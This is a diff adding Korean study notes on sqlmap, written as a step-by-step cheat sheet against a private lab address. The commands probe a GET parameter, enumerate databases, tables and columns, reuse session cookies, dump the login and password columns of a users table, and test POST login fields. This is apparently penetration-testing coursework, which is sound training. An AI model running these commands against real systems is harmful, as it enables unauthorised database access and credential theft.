@@ -1,0 +1,33 @@
+***개념***
+	공개 모의침투 도구로 SQL구문삽입(SQL Injection) 취약점을 탐지/진단하고 데이터베이스에 직간접적으로 접근할 수 있는 취약점 분석 도구
+
+***사용법***
+	GET 방식 입력값 점검
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1"
+
+	데이터베이스 목록 조회
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs
+
+	쿠키값이 필요할 경우
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1" --cookie="security=low; PHPSESSID=letmado2cqoj2vd2i0873168h5; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs
+
+	테이블 목록 조회
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables
+
+	컬럼 목록 조회
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns
+
+	테이블 내용 덤프
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns
+
+		sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users -C "login,password" --dump
+
+	POST 방식 입력값 점검
+
+		sqlmap -u "http://192.168.23.131/admin/index.php" --data "user=USER&password=PASS"
